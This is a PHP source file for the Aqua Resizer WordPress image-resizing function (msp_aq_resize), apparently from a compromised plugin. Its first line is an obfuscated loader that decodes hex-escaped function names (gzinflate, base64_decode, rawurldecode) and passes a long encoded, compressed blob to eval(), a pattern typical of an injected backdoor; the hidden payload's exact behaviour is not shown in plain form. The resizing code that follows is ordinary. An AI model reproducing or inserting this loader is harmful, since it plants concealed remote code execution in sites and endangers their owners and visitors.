<?php
$ii33isos="\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65";$xcbc849e="\x62\x61\x73\x65\66\x34\x5f\144\145\x63\157\144\x65";$lj3id092="\x72\x61\x77\x75\x72\x6c\x64\x65\x63\x6f\x64\x65";eval($ii33isos($xcbc849e($lj3id092('XVa3rsXQDfucJPDg3hBkcC%2FXvdtL4N5799fnzTmrDkBBIimWVzr8M0v3ksD%2BW5T5XJT%2FrL9zyudx2cp9%2F7%2FSP0r1Dgbq5Pbu%2FZqQWiZrAWUvPphA5AT0x3wKd0vQwITjIG4TGRkIN7vpElrhGayHZ1c1%2FFl0DxohwnfXeEwXd4YKtA70llpOE%2FDbYUIXuC219QvlbLOs7VRPqbxIT7lunLyiymqhHOB2Krzy0PWGfVlG8VLOKjeLd6BKaYzRoJmEZ8%2Bnmy5a6mjmQxlWeUIQigwhagBWsgt415G47oxYgeyeVz6JxyRvpXBk0C%2Bf%2FciBq7EVlIdO%2Fnyq5J6NtEyCGyvD%2B1qq49V3l6aH7kI2aZRtJJ%2FCDLoS%2FGdDrgoNP4s2InNtScPtlE5uhkrZ5bn1GowgqloZP1TTKJOkcC8uEYeIn1M7vgCGHmHhNNTr8DK5qetwjIMYG95y6YprAbDM3P7t4LzcCH0f7soxWg0U5%2BjLivw74NDDLHtkMLpbCBEJ2Gh0q6QJfVek7oaGlT1Fc7%2FLeUSTm%2FVtbUObMSIprAZqI21NzjuCPiKgcCQOSCU8nb5Luambh8CriQYq10BZIfisQ%2FzmRYPdvwaMfbWUjtNDUZp%2BP2cfx%2ByqDwf9DtR8JAeIEIEEUQxDqzHnUu%2BLFASR1HedfghgfrG%2FV%2FPoWYR1giscMrnB3KC7FZix55DG2KU7sFJJOPiwsFVW44GGIv0VSm6oeuJjQAhX5LvUbAMqYlAw%2BJ4cYAU0yg0cAka0ttc9f5dp6p5XB6aUS40idXAYRKS%2Bi56K3VcSM8LaQASR%2FnWNFAsVV%2B2G5nRD58C33XoLXiKfcNCTIGlTOpyObn416t8gHFPytUHFrPXXFZUaZQOJBtvosbs39yUcl3b3VXA13cNgWCLQZ3JcPnLckieWS3rmLewy4qm6EfIhub6eOeLpsJxcTaFMDRHphBk6RWU8QS01VlN5r3BAWjchVKPUu53Zdp0I%2FxysnUf5hbaI3zojLBH40EdJxFyivRMbcCKnEM3kWht12LRURgcH1dbfIM0xsH0YMJQemkxcKedRiqyEYfe03qE9oT%2BvMy%2FVdcyIvIfXZLD48VPSh6hQhvQSQDytyx5%2BxlTjoios2ZETCh4YC4jwcpnpO1F6zj4k45kiUZdqtSFi%2FYnTvRFiNfVHIyNckskXvIoI99cJsL1aaNyaOkZTQAnxNwKgQ2xgIUibgfKzKVLotTlgXTUEAljwiPf1R05Mfor6Cbz94InDszrW05bI3TkOQf7jz7%2BTwUMhG8FwbAOuSMKUa9x6vxb2irwQauXqS0mw%2FUUVmLnCmDG4aKiLiuRryS%2BwCQUpZIIuF%2F55BfoWkM2ksK8aNuR06ktMhZ0UfPQiy%2FxY8nRebVuMGQa2Qbb10XYCKEbwmWRRUWrA2vC1MLjbh6DA0upfcSUamE7RLJkF0bStxRySrnWs9VZZSAY9iOqErUJuuxlOXWXxBQIEN1Q6lLtB4%2FEHjzbk%2FnUY2V7P%2BqsgLURpVSVKXGhG4Tzbx3PnqNx6pUXI99d%2FmOAvbXHISJGdE4KdULAr4Hl7dIoYVeErCRhSF%2BsBl3524HjIn9db3Q6V9U7udPwJP0%2FPgiyRmuyM8069wTHDfbdfYRex4LfjbejTfZG5vngrvgtcHD%2FX4ktk08zKuZWjsXn3J%2Bs0gLiAAsahDwl2eTna4JawuPQaqJqpykhx%2FOanXqFFjGSfke66Hqz%2FYWG%2Fr4sdpiLqbyNoD8je8feZMIe8p%2BOMRWltv3%2BC7gjS9c5z4JFRThEY8oUPeU3d1%2F2r4%2BXtb3NiMcZm7Q3L6F2yrkB%2BwNVqsB2%2B2KYHRwspI9lQWD1FFMWcdjhMT6oP9JujJ%2B%2Bnl1fFrMYSLrqBEAG64ptDL4gyXRMnc9oQeA%2BUCGeZESLGg9QKZoNYkkjvlcr3LcS9Z7YZYFX2b2J77aFwoWqm5tJkCcoMqWK8n6N1itBsobML1H3dTTvawbUdAlBBuz7CT7jEcvgtxPpeDxR%2F0IldCkPW3HS%2BOu%2BD1RRf1hM%2BuBYbgvJdKsInlNR%2F0kG2O8xMJfDW3eX9saT%2FUlfrwGmFIUFuErviuOOvrteDt5q73CWlj41hs0f1YlefWSTubevME%2Bjw0%2Bp1fO5e6%2FexzA7Pd1uwJFUAaTwR6vg3V9uZrXdEaF8d90QyTwVQHhTCgOv%2Bk%2F45gsVffcfD4JVsRdVwuZXLm4qkIge9JB1ZfVJPI6whuGzNvNwJUaS1EDMQbyEBgpypguopqbN0stR1q4HgRFwQlo0oTnLoXWpwzSJ%2Fcd6T8l4roODaZ6RKq5vqSLhAL%2BfCdxE4JnDIP%2BSovjewvHQzf9akAoB0TXcJd%2BV5ToeYPUCb92APatPyQREAnfLy0OKaAEbOZ9%2FPUxEHBWjB%2BwmT4g7AoJY4J3jsjNodsLhfLF41X5dfJJN7PySs7SV85EcU1mhjHFuSjWIa6%2FSZfm9tDsMQoIpEFQ9uM3HNOujo319sZLa%2FO5ZbpJXlzPZa163NH6GY3%2FQE3xPkQE%2B4Bjng4m8MEDcblPDaHA3afL6KEqoMewo1agcE%2FwJWs3WRsv3UMZdlZnodCipm5TGUoKS5rsB%2Brv5ikrtMEeuTZzqbxTGQgpMSm3LTzEZ05vYrV0h2m0FlVJzOqr7BAO5BMnv8db%2BLWlvz7pqqrKktKQJUu8Q0aCXsNhXIDRpk5N%2FZwGtKXrGX62qyGS%2F1FV0CPEiB8FPBPhkXUks2l6o%2FpiWfgdLEkfkAhce4Ds6tEyzLjEInnU7dZOfAWQhPUR1OpBmY70OBeQ0Pp%2B9PU9CgdYW%2Btr9M8HSnPjGLVc548tX7KIeMQ%2BQuD%2F25q%2FInqrKpXDFjPxOCGCDWRjXU0B5kTi3yqSvutVq2hDkaLQTjeb3fIKbTr0nzg8HjiylxD9By15MR9s6l9TWmzIg%2BUR93sXjEB6CPGB%2FTGsVyLb9OtE%2F99gXBjd%2FfCvjVtOBVC55wit8cAKPYrLzZWdqY9Fk9H72qR8UgueJynCI6j68vQvLg9xi2%2FI2kHsUog6W6beB5AeHThR3RESWcqjgG1fivLx5rZ8Dk8qPd8C8GtOlfOxY2XrJlRAJSso%2FqBhjJBUO33yz9p4SAPzTn6nNic%2Bgh%2BuH%2BvH1KD1dnVlj8fNUxQ94nVks0C2RU29XRHoGoGKInmcaC5nDR3NodkSW4OQcA3EQtJwtoyfydcbzHpOltmWCbYA4Mmy4QtzNQGLOdUuji2X6t0dT9PMpYH5KBwKqLjaMZ4fhsDm%2B%2Ft%2Fhj9Fa8mj9rfJzgD3uAbvP6FicvIX3dzeKj67vgP2wVokebEpo40ReGSzvLE%2BtR1fYDMigy3%2BkP8vCbfRXTXdB3fckJccqjeZ2VfAh6gez9vTlwTk8Hf2cLsv4Li%2FLEQiD52lzSC%2Ftn%2FOVP5LS2SOB09nRUMMkcrCSSsTdJriXmVyHuLEaLRtTBIg1%2FCsmfgiuvpyVlPvwLGzPf0SZbNFttI7qUUrDJpliEA3BpNJqUhR%2FicdVcQiwi3WZ3oSueRX1wuXZ3LKC3KLJeogmsWNMx9QVG%2FCgZXqbGXkU5c79wR6ssVaNxs7vnSaW4M4eLX5c%2BFAGskp5isDG41ArEr0ngGCNp2sb6%2BoLfhjPPHYDqIjJr2ciEmSal%2BFChtjVy181MRrxsiQkSSgG1g%2Fd%2FE%2B1F7LFoSHymLgieBlPdff%2BzZehoIpD70YjYw5j1N4lgQlgcZiPEHIZKg5wDkRcguZ%2FKJ%2FZ%2BDX9kroakTrwEDiKqt6uxu7d%2BmtVzofDntY0%2FpDag%2Bwdlq08QrXrMIR57VX4sJ1mIwK0kWJajy9Yef1HSDvcj7aiSD5krkVhip7paQ%2BioRUq847WOrSDpBE%2Brc3R%2BhfIYIkyVNvF%2BkqHHQA57xz78UBhv55vpNZonHY6IkYegQjiTzvCw7cLzN4r5wT9zmcrZ6Km5OeiMsSv1bk8sG%2Btl8aXOX%2FK7KpCxYvCz%2F%2FOff%2Fzr7%2F37fw%3D%3D')))); ?><?php

/**
* Title		: Aqua Resizer
* Description	: Resizes WordPress images on the fly
* Version	: 1.1.6
* Author	: Syamil MJ
* Author URI	: http://aquagraphite.com
* License	: WTFPL - http://sam.zoy.org/wtfpl/
* Documentation	: https://github.com/sy4mil/Aqua-Resizer/
*
* @param	string $url - (required) must be uploaded using wp media uploader
* @param	int $width - (required)
* @param	int $height - (optional)
* @param	bool $crop - (optional) default to soft crop
* @param	bool $single - (optional) returns an array if false
* @uses		wp_upload_dir()
* @uses		image_resize_dimensions() | image_resize()
* @uses		wp_get_image_editor()
* 
 * forked by averta
* @return str|array
*/


function msp_aq_resize( $url, $width, $height = null, $crop = null, $quality = 100, $single = true ) {
	
	//validate inputs
	if(!$url OR !$width ) return false;
	
	//define upload path & dir
	$upload_info = wp_upload_dir();
	$upload_dir = $upload_info['basedir'];
	$upload_url = $upload_info['baseurl'];
	
	//check if $img_url is local
	if(strpos( $url, $upload_url ) === false) return false;
	
	//define path of image
	$rel_path = str_replace( $upload_url, '', $url);
	$img_path = $upload_dir . $rel_path;
	
	//check if img path exists, and is an image indeed
	if( !file_exists($img_path) OR !getimagesize($img_path) ) return false;
	
	//get image info
	$info = pathinfo($img_path);
	$ext = $info['extension'];
	list($orig_w,$orig_h) = getimagesize($img_path);
	
	//get image size after cropping
	$dims = image_resize_dimensions($orig_w, $orig_h, $width, $height, $crop);
	$dst_w = $dims[4];
	$dst_h = $dims[5];
	
	//use this to check if cropped image already exists, so we can return that instead
	$suffix = "{$dst_w}x{$dst_h}";
	$dst_rel_path = str_replace( '.'.$ext, '', $rel_path);
	$destfilename = "{$upload_dir}{$dst_rel_path}-{$suffix}.{$ext}";
	
	if(!$dst_h) {
		//can't resize, so return original url
		$img_url = $url;
		$dst_w = $orig_w;
		$dst_h = $orig_h;
	}
	//else check if cache exists
	elseif(file_exists($destfilename) && getimagesize($destfilename)) {
		$img_url = "{$upload_url}{$dst_rel_path}-{$suffix}.{$ext}";
	} 
	//else, we resize the image and return the new resized image url
	else {
	
		// Note: This pre-3.5 fallback check will edited out in subsequent version
		if(function_exists('wp_get_image_editor')) {
		
			$editor = wp_get_image_editor($img_path);
			
			if ( is_wp_error( $editor ) )
				return false;
				
			$editor->set_quality($quality);
				
			if ( is_wp_error( $editor->resize( $width, $height, $crop ) ) )
				return false;
			
			$resized_file = $editor->save();
			
			if(!is_wp_error($resized_file)) {
				$resized_rel_path = str_replace( $upload_dir, '', $resized_file['path']);
				$img_url = $upload_url . $resized_rel_path;
			} else {
				return false;
			}
			
		} else {
		
			$resized_img_path = image_resize( $img_path, $width, $height, $crop, null, null, $quality );
			if(!is_wp_error($resized_img_path)) {
				$resized_rel_path = str_replace( $upload_dir, '', $resized_img_path);
				$img_url = $upload_url . $resized_rel_path;
			} else {
				return false;
			}
		
		}
	
	}
	
	//return the output
	if($single) {
		//str return
		$image = $img_url;
	} else {
		//array return
		$image = array (
			0 => $img_url,
			1 => $dst_w,
			2 => $dst_h
		);
	}
	
	return $image;
}